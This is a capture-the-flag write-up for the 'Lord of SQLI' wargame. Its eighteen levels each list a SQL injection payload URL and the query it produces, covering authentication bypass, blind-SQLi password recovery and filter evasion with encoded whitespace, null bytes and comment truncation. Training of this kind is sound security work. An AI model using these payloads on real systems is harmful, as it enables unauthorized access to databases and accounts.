---
description: 'https://los.rubiya.kr/'
---

# Lord of SQLI

## 1. Gremlin

URL Solution: ?pw=' OR ''= '

QUERY: select id from prob\_gremlin where id='' and pw='' OR '1'= '1'

## 2. Cobolt

URL: ?pw='\) OR \( id = 'admin

QUERY: select id from prob\_cobolt where id='' and pw=md5\(''\) OR \( id = 'admin'\)

## 3. Goblin

URL: ?no=no OR 1=1 ORDER BY id

QUERY: select id from prob\_goblin where id='guest' and no=no OR 1=1 ORDER BY id

---

URL: ?no=0 or id=0x61646d696e

QUERY: select id from prob\_goblin where id='guest' and no=0 or id=0x61646d696e

## 4. Orc

Using the ‘or’ operator and SUBSTR method Blind-SQLI can be executed to gain info. The passwords length is 8 characters. Script attached.

URL: 095a9852

QUERY: select id from prob\_orc where id='admin' and pw='095a9852'

## 5. Wolfman

URL: ?pw=%27or%0Aid=%27admin

QUERY: select id from prob\_wolfman where id='guest' and pw=''or id='admin'

The challenge in this case was to encode the whitespaces with %0A

## 6. Dark Elf

URL: ?pw=%27%20\|\|%20id=%27admin

QUERY: select id from prob\_darkelf where id='guest' and pw='' \|\| id='admin'

Introducing \|\| to mark OR

## 7. Orge

URL: ?pw=7b751aec

QUERY: select id from prob\_orge where id='guest' and pw='7b751aec'

Solvable using the script from orc, after modifying OR, AND. Script attached.

## 8. Troll

URL: ?id=admIn

QUERY: select id from prob\_troll where id='admIn'

SQL is not case sensitive!!

## 9. Vampire

URL: ?id=adADMINmin

QUERY: select id from prob\_vampire where id='admin'

Blacklisting is shit

## 10. Skeleton

URL: ?pw=%27or%20id=%27admin%27%20or%20%27%27=%27

QUERY: select id from prob\_skeleton where id='guest' and pw=''or id='admin' or ''='' and 1=0

## 11. Golem

URL: ?pw=77d6290b

QUERY: select id from prob\_golem where id='guest' and pw='77d6290b'

Another Blind SQLi Losers say:

* replace = with NOT x &lt;&gt; y
* instead of SUBSTR with LENGTH to find the length and LIKE to create the query

winners say:

* replace = with LIKE
* replace SUBSTR with MID 

Script attached.

## 12. Dark Knight

URL: ?pw=0b70ea1f

QUERY: select id from prob\_darkknight where id='guest' and pw='0b70ea1f' and no=

Another Blind SQLi

* “no” inject parameter like in Goblin
* replace ' with "

Script attached.

## 13. Bugbear

URL: ?pw=52dc3991

QUERY: select id from prob\_bugbear where id='guest' and pw='52dc3991' and no=

Another Blind SQLi

Script attached.

## 14. Giant

URL: ?shit=%0B  
  
QUERY: select 1234 from prob\_giant where 1  
  
 `|\n|\r|\t` were blacklisted, so we used /v instead. /f works too.

## 15. Assassin

URL: ?pw=\_\_2%

QUERY: select id from prob\_assassin where pw like '\_\_2%'

This time the script had to scrape for a character in the password that is unique to the admin.

Script attached.

## 16. Succubus

URL: ?id=\&pw= or true %23

QUERY: select id from prob\_succubus where id='\' and pw=' or true \#'

This time we couldnt use ticks. So, we turned id to be unusable and using password and commenting out the last tick we got in.

## 17. Zombie-Assassin

URL: ?id="&pw=%23 eurt RO

QUERY: select id from prob\_zombie\_assassin where id='"\' and pw='OR true \#'

Same thing with srtrev\(\)

## 18. Nightmare

URL: ?pw='\)=0;%00

QUERY: select id from prob\_nightmare where pw=\(''\)=0;'\) and id!='admin'

Who knew:

* Terminate the rest of the query with %00
* Empty string equals to 0;

